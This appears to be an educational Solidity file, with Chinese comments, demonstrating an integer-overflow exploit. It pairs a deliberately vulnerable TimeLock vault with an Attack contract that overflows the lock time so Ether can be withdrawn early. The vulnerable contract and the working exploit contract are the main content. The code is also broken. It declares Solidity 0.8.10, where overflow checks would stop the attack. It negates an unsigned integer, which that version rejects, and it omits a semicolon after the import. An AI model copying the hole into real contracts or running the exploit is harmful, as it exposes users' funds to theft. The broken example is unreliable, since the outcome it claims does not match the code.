// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
//大于或低于当前数字的有效范围（uint = uint256默认）整型溢出漏洞，由于solidity 0.8.0 版本后内置 Safemath 的整型溢出检查，这类漏洞已经很少见了。
// 预防办法
// Solidity 0.8.0 之前的版本，在合约中引用 Safemath 库，在整型溢出时报错。

// Solidity 0.8.0 之后的版本内置了 Safemath，因此几乎不存在这类问题。开发者有时会为了节省gas使用 unchecked 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。
// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

// Solidity 0.8.0 之前的版本，在合约中引用 Safemath 库
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol"
contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
        //SafeMath处理预防整型溢出攻击
        // lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            // type(uint).max + 1 - timeLock.lockTime(address(this))
            // 2**256 -t
          uint( -timeLock.lockTime(address(this)))
        );
        timeLock.withdraw();
    }
}
